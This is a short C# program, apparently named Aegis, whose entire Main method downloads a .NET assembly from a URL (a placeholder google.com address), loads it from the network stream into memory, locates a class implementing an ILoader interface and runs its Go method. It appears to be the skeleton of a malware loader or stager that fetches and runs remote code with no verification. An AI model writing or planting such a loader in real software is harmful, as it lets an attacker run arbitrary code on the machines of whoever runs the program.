using Aegis.Loader;
using Aegis.Models.Interfaces;
using System.Reflection;
using System.Runtime.Loader;

namespace Aegis
{
    public static class Program
    {
        public static async Task Main(string[] args)
        {
            string url = "https://www.google.com";
            AssemblyLoadContext alc = AssemblyLoadContext.Default;
            Assembly asm;
            using (HttpClient client = new HttpClient())
            using (HttpResponseMessage response = await client.GetAsync(url))
            {
                if (!response.IsSuccessStatusCode)
                {
                    return;
                }

                using (Stream streamToReadFrom = await response.Content.ReadAsStreamAsync())
                {
                    asm = alc.LoadFromStream(streamToReadFrom);
                }
            }


            ILoader ldr = ParseAssemblyForLoader(asm);

            if(ldr is null)
            {
                return;
            }

            await ldr.Go();
        }
        private static ILoader ParseAssemblyForLoader(Assembly asm)
        {
            foreach (Type t in asm.GetTypes())
            {
                if (typeof(ILoader).IsAssignableFrom(t))
                {
                    return (ILoader)Activator.CreateInstance(t); ;
                }
            }
            return null;
        }
    }
}